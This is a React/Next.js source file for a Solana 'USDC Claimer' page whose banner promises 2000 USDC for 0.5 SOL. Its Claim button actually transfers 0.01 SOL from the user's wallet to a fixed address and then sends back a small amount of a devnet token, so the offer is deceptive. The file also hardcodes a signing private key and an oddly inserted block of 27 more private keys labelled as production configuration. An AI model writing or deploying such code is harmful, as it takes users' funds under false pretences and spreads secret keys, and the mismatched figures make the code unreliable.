/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3mHbyJQge73UY2fHCvGWkGcnREaESfzcjR9Lnj5Hui8jX84W5yJDk9rrv319eUXkDxJ9NGYf6QhQCLaUhvbJvofQ"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3Nuta31EUeMafudhWJQp1N3yt13733J9Uh5zTmYRKKVm4GSML3BHeAicgzgr9obGoPzyA8Mv2f7a71FAiiQF3BNT",
  "key1": "dGbxjafSU6GWE6BUw7RMwjEMoxjmfydkJXyfAjCwrXSygVwrqVGYgDuLvkqhfU91TZojVgSordQM6LEx4vTRTog",
  "key2": "5ze2wNfPJ8nBJYeUMwfTaoQy4sp4gWxYUjGLmtWkQUCrmKCsTArbfWTx3wn7hfj1Df62NMmsXx2uuGTHPmNq1dvp",
  "key3": "5874SFURAmVaQxVxS1pb3FWQiCfjJM2TjYTbKVDykbVgT5TMw9HzpQL6WQTd9bFS1BApFepTSRKevYLMcKxZMb9X",
  "key4": "41FS6ue7mHKwdQps6Px3BrSrMBfyJ68uhqBoW5e7K8bJYU3Dg2N54AZqJJguHiEo3PjcwzpNPY1GjkVDWDczqmzF",
  "key5": "5BdSwm9wo7pKHVokvpPp6d46DmHsS66v2f2GV2coVhqWRaP1WQGky7z1wHW4By9k23DDLuZK12MjjsjaTynkUAD9",
  "key6": "4oUae2XECLHUyT9ccaZ5m1MN9opBL9Ttps2G6FMungznkx5R5v6qcPjkC95u8E2XkYbrWrEhEA1cLncg33B1QpBv",
  "key7": "3pA2gyXoC7gPPYvHSwZC7ntPYtBXwryD1Cf4ep3AoiR1MMCdWBCywXHydCAeypiRrdsArpytH5UDMD6oer4DhAnU",
  "key8": "3hoKrWVdaapxSbZYARTBSYTPQKTM7H3bkUvKdYb6RYnWovBa8tQAJ97qiBXCptbjzafYaQ4d5uAjG3NiCsKKV5uv",
  "key9": "SJtK62hGVF1V6sw6ARzR5vaci2a68fEYhvpAWrYBojZCwx6gBbWyscJdB3ugYqTEZKY5uZEtdzqoSN9aDz2mrbF",
  "key10": "4RdFgS4q8qXX8CvZhx2dCSAfTx2zm9wZ7kybnvg9TATXKnVGVY79Sm4t9rpuJkRcxhAeiVRZM7mj2vZWsBxdHT1Z",
  "key11": "5sLhdnu57N7MWmixE5oas9Js1CrdRhJCmjwdgt1EAMBFxR2iNJnUSBRrs8aiZRD1hqCeQetV1n5CcYTGbK6A2QuU",
  "key12": "cVLgEkbGdd51XyCEsnqVfSeur6KNFdgRnxDSbUmBKd9PhEF5UQJuTts2H1puruYPNbLZsKY9B9bECtvZS1WzvaE",
  "key13": "46YPt5xyJtxT7VmUcvoN6rKzDJkk2emjABYJkk4EnfyprhuyNHVi1Yq72LvKkxa5Kc3SQQ1Hfg9AhoT8sY9eCGBE",
  "key14": "ko4ERbx4dYbSMbgotvytMFDWwNYmrNXNHH6rBeb1r4tfoDfujmra1dZxdh3JnMAmN5zNFHCmsW4ZZBDaK3UsjVA",
  "key15": "5KoJkk4z2rtDXAvw8FUp3aSWmeTLZTM97gdTwiG8GaQj84K5dBgZoYMkCbB3nPtE1SXTdPCQac6MhMHDed5PHRG6",
  "key16": "4etARt9mmiij7vTLP9466iSLYFZihAf1yY3AXe6eqGVqsNQbAevCxAaeJSdnyKCmfwvURkU8wgBFhtg6Sn85czV6",
  "key17": "4k7j6t7aAE9YSmdtd7YnGwcQoSo3J9U6rmDKq4abXRAQZsKDr7RjVACiDavhroasXM7wWFczhRYfqEjs4Bu6dFi8",
  "key18": "1nLc4k12yiUnqx2rQvTzinP9w7N9XCi1aSeyNJfdSebAmLrKU94sSKBAm9vaWTNJYJQVoq6EwwRNGCjthhMFqFT",
  "key19": "5fXrUEJxy1ZJDbdgNjLokKoygVcdp3M8CgiLQCSV5qUNJH2iakiyEZZX7snQeBZx2H9SKMmEkzmFmAer776S3YZp",
  "key20": "nX9rq6soUe9HNAJkKKLJ4pWVYxC2LYSMA6h7YD3A38nmG3kAizfFVnD7VrYdCVHRaVKef4vmgn9KTcmw5P7kvDb",
  "key21": "3MRUN3AwMvgjqsyakmQBzWHTX17Cy29UPdJFV11YgamFf5iNPFLMn67pmuuyYK5HnEj9WNHxQUJH9B7xXTtcGQNr",
  "key22": "kRXyZvdVtr7bTnQaFL217qBsNAXvP9de4msMCziL3GyTnZF2W2vAoJVVBFJJzZZLc4CynWQ6maxdXmJLaX4Pfvz",
  "key23": "231EQGJDk13jEtDqCCoCxd8QiwE5iiy3x4XyQQXmQDDxWnHGaX5U6C1oGcWH8bNjbZBEGsfKkLS8D6YuHAAR23aj",
  "key24": "5PKuSb8PwTZf7U7wKrwx3noAWpZCtRc7gfjQMXsEvnZdJLuroGqjpbkQWCXpKxsDi3WS8pesPBHBczG5NcPFDeeN",
  "key25": "5Jp7w6Xhk4gHAr24DoaabQ7W2vv6beHfVbUWNxq4vATpQt6mnx4GR4RGuHRqydtrGQf1ufj3ePM9yCXDUtj3Xfkf",
  "key26": "3EqqdXmcyxwtL2xUBDzxbcGirkemL6GDodS3iXXbkPa6tegEVK1kCMudtfjKXWTypqskgS5ic2AT2LUaEfRK4FfP"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
